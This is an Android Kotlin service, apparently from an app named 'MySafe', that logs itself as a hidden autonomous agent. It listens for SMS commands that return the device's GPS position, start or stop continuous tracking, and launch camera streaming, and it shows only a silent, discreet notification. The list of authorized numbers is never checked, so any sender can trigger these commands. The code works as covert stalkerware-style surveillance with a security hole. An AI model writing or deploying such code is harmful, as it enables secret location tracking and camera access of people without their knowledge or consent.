package com.mysafe.mysafe

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.*
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.text.SimpleDateFormat
import java.util.*

class MySafeAgentService : Service() {
    companion object {
        const val TAG = "MySafe_Agent"
        const val ACTION_START = "AGENT_START"
        const val ACTION_STOP = "AGENT_STOP"
        const val CHANNEL_ID = "MySafeAgent"
        
        private var instance: MySafeAgentService? = null
        fun isRunning() = instance != null
        
        // Pour être appelé depuis le récepteur SMS
        var commandeRecue: ((String, String) -> Unit)? = null
    }

    private var lastLocation: Location? = null
    private val MIN_DISTANCE_METERS = 10f
    private val MIN_TIME_INTERVAL = 90000L // 1min30s
    private var isTracking = false
    private var lastSentTime = 0L
    private var numerosAutorises = mutableSetOf<String>()

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
            Log.d(TAG, "📍 Position: ${location.latitude}, ${location.longitude}")
            verifierEtEnvoyerPosition(location)
        }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        creerNotificationCanal()
        startForeground(1, creerNotificationDiscrete())
        
        commandeRecue = { commande, numero ->
            traiterCommande(commande, numero)
        }
        
        Log.d(TAG, "🔒 AGENT CACHÉ DÉMARRÉ — 100% AUTONOME")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> demarrerSuiviGPS()
            ACTION_STOP -> arreterSuiviGPS()
        }
        return START_STICKY
    }

    fun ajouterNumeroAutorise(numero: String) {
        val nettoye = numero.replace(Regex("[^0-9]"), "")
        numerosAutorises.add(nettoye)
        Log.d(TAG, "✅ Numéro autorisé ajouté: $nettoye")
    }

    private fun traiterCommande(commande: String, numeroExpediteur: String) {
        val numeroNettoye = numeroExpediteur.replace(Regex("[^0-9]"), "")
        
        Log.d(TAG, "📩 Commande reçue: '$commande' de $numeroNettoye")
        
        when (commande.trim()) {
            "MYSAFE_SEND_POS" -> {
                Log.d(TAG, "✅ Envoi position à $numeroExpediteur")
                envoyerPositionParSMS(numeroExpediteur)
            }
            "MYSAFE_START_TRACK" -> {
                Log.d(TAG, "✅ Démarrage suivi GPS")
                demarrerSuiviGPS()
                envoyerConfirmation(numeroExpediteur, "SUIVI_ACTIF")
            }
            "MYSAFE_STOP_TRACK" -> {
                Log.d(TAG, "✅ Arrêt suivi GPS")
                arreterSuiviGPS()
                envoyerConfirmation(numeroExpediteur, "SUIVI_ARRETE")
            }
            "MYSAFE_CAMERA_ON" -> {
                Log.d(TAG, "✅ Démarrage caméra")
                demarrerStreaming()
                envoyerConfirmation(numeroExpediteur, "CAMERA_OK")
            }
        }
    }

    private fun demarrerSuiviGPS() {
        if (isTracking) return
        isTracking = true
        
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            lm.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            lm.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            Log.d(TAG, "✅ SUIVI GPS ACTIF — 10m / 1min30")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur GPS", e)
        }
    }

    private fun arreterSuiviGPS() {
        isTracking = false
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        lm.removeUpdates(locationListener)
        Log.d(TAG, "✅ SUIVI GPS ARRÊTÉ")
    }

    private fun verifierEtEnvoyerPosition(location: Location) {
        val maintenant = System.currentTimeMillis()
        
        val lastLoc = lastLocation ?: run {
            envoyerPositionATousNumeros(location)
            lastSentTime = maintenant
            return
        }

        val distance = location.distanceTo(lastLoc)
        val tempsEcoule = maintenant - lastSentTime

        if (distance >= MIN_DISTANCE_METERS || tempsEcoule >= MIN_TIME_INTERVAL) {
            envoyerPositionATousNumeros(location)
            lastSentTime = maintenant
        }
    }

    private fun envoyerPositionParSMS(destinataire: String) {
        val loc = lastLocation ?: return
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val message = "MYSAFE_POS:${loc.latitude},${loc.longitude},$time"
        envoyerSMS(destinataire, message)
    }

    private fun envoyerConfirmation(destinataire: String, reponse: String) {
        envoyerSMS(destinataire, "MYSAFE_ACK:$reponse")
    }

    private fun envoyerSMS(destinataire: String, message: String) {
        try {
            SmsManager.getDefault().sendTextMessage(destinataire, null, message, null, null)
            Log.d(TAG, "📤 SMS envoyé à $destinataire")
        } catch (e: Exception) {
            try {
                SmsManager.getDefault().sendDataMessage(
                    destinataire, null, 50006.toShort(),
                    message.toByteArray(Charsets.UTF_8), null, null
                )
                Log.d(TAG, "📤 SMS données envoyé à $destinataire")
            } catch (e2: Exception) {
                Log.e(TAG, "❌ Échec envoi", e2)
            }
        }
    }

    private fun envoyerPositionATousNumeros(location: Location) {
        // À implémenter si besoin d'envoyer à plusieurs numéros
        Log.d(TAG, "📍 Position mise à jour: ${location.latitude}, ${location.longitude}")
    }

    private fun demarrerStreaming() {
        val intent = Intent(this, StreamingActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun creerNotificationCanal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(CHANNEL_ID, "MySafe Service", NotificationManager.IMPORTANCE_LOW)
            canal.setShowBadge(false)
            canal.enableVibration(false)
            canal.setSound(null, null)
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(canal)
        }
    }

    private fun creerNotificationDiscrete(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MySafe")
            .setContentText("Service actif")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setContentIntent(PendingIntent.getActivity(this, 0, Intent(), PendingIntent.FLAG_IMMUTABLE))
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        arreterSuiviGPS()
        instance = null
        commandeRecue = null
        Log.d(TAG, "🔒 AGENT ARRÊTÉ")
    }
}
